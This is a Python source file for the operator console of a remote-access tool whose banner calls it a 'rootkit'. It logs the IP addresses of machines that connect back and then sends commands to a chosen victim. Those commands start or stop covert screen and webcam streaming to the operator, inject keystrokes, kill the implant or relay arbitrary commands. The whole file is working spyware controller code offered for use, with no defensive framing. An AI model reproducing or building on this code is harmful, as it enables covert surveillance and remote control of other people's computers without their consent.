import socket
import os, re, time
from vidstream import StreamingServer
from inputimeout import inputimeout, TimeoutOccurred
import threading

def Ip(data, ipmodify="0"):
    if data == "modify":
        ipyou = open("ip.txt", "w")
        ipyou.write(ipmodify)
        ipyou.close()
    if data == "return":
        try:
            ipyou = open("ip.txt", "r")
            ret = (ipyou.readlines())[0]
            ipyou.close()
            return ret
        except:
            ipyou = open("ip.txt", "w")
            ipyou.write("nothing")
            ipyou.close()
            return "nothing"
        
def stopSpaceError(data):
    data = " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
    return data

def start():
    global ipToConnect, ipHost, port
    ipToConnect = str()
    ipHost = Ip("return")
    port = 22228
    os.system('cls' if os.name == 'nt' else 'clear')
    print("###################################"+"                                                          connect to "+ipHost)
    print("##### r007k17 by 7r1574n n13l #####")
    print("###################################"+"                                                          port "+str(port))

start()
if ipHost == "nothing":
    Ip("modify", input("write your ip : "))
    ipHost = Ip("return")
    start()

def help(data):
    if data == "command":
        ligne = None
        f = open("help.txt", "r")
        while ligne != "___________________________________________________________________ ":
            ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
            if ligne != "___________________________________________________________________ " and ligne != " ":
                print(ligne)
        f.close()
    if data == "sending":
        f = open('help.txt', 'r')
        NumberOfLine = 0
        for line in f:
            NumberOfLine += 1
        f.close()
        f = open("help.txt", "r")
        ligne = None
        x = 0
        while ligne != "___________________________________________________________________ ":
            ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
            x += 1
        count = 0
        while x < NumberOfLine:
            print((re.compile(r'[\n\r\t]')).sub(" ", f.readline()))
            x += 1
        
def command(commandToExecute):
    commandToExecute = stopSpaceError(commandToExecute)
    commandToExecuteList = commandToExecute.split()
    global ipToConnect
    try:
        if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
            if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
                return commandToExecuteList[1]
            else:
                print("[ERROR]: no ip requested")
                command(input(">"))
        elif commandToExecute in ("getIp", "Ipget", "getip", "ipget"):
            getIp()
        elif commandToExecute in ("listIp", "Iplist", "iplist", "listip"):
            listIp()
            command(input(">"))
        elif commandToExecute in ("stop"):
            global progrun
            progrun = False
        elif commandToExecute in ("help", "aide"):
            help("command")
            command(input(">"))
        elif commandToExecuteList[0] in ("modify", "modifyip"):
            if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
                Ip("modify", commandToExecuteList[1])
                start()
                print("#                                 #")
                print("##########  ip modified  ##########")
                command(input(">"))
            else:
                print("no ip write")
                command(input(">"))
        elif commandToExecute in ("clear", "cleared", "cls"):
            start()
            command(input(">"))
        else:
            print("Error")
            command(input(">"))
    except:
        command(input(">"))
    
def sendData(data):
    global run
    datalist = data.split()
    if data in ("die", "kill"):
        client.send("die".encode())
        run = False
    elif data in ("help", "aide"):
            help("sending")
    elif data in ("left", "quit", "restart"):
        client.send("left".encode())
        run = False
    elif data in ("screenStart", "screenstart", "screenRun", "sreenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
        client.send("screen".encode())
    elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
        screenStop()
    elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
        client.send("camera".encode())
    elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
        cameraStop()
    elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
        datalist.pop(0)
        data = "fast "+" ".join(datalist)
        client.send(data.encode())
    else:
        client.send(data.encode())

def getIp():
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.bind((ipHost, 22228))
    serverSocket.listen()
    (clientConnected, clientAddress) = serverSocket.accept()
    print("Connection acquired from %s:%s" % (clientAddress[0], clientAddress[1]))
    serverSocket.close()
    addIp(clientAddress[0])
    command(input(">"))


def addIp(ipToAdd):
    f = open("ListIp.txt", "a")
    f.write(ipToAdd + "\n")
    f.close()


def listIp():
    f = open("ListIp.txt", "r")
    lines = f.readlines()
    for line in lines:
        print(line)
    f.close()
    command(input(">"))


def screenStop():
    global screen
    screen.stop_server()
    screen = StreamingServer(ipHost, 22224)
    t = threading.Thread(target=screen.start_server)
    t.start()
    
def cameraStop():
    global camera
    camera.stop_server()
    camera = StreamingServer(ipHost, 22225)
    t = threading.Thread(target=camera.start_server)
    t.start()

def creatClient():
    global screen, camera, client, run
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(5)
    try:
        client.connect((ip, port))
        screen = StreamingServer(ipHost, 22224)
        t = threading.Thread(target=screen.start_server)
        t.start()
        camera = StreamingServer(ipHost, 22225)
        t = threading.Thread(target=camera.start_server)
        t.start()
    except:
        run = False
        try:
            print("can't connect to "+ip)
        except:
            print("ip isn't allowed")

progrun = True

while progrun == True:
    ip = command(input(">"))
    run = True
    if progrun == True:
        creatClient()
    while run == True and progrun == True:
        try:
            dataToSend = inputimeout(prompt="%s>" % (ip), timeout=120)
        except:
            dataToSend = "left"
        sendData(dataToSend)
    try:
        camera.stop_server()
        screen.stop_server()
    except:
        pass
print("prog stop")
exit()
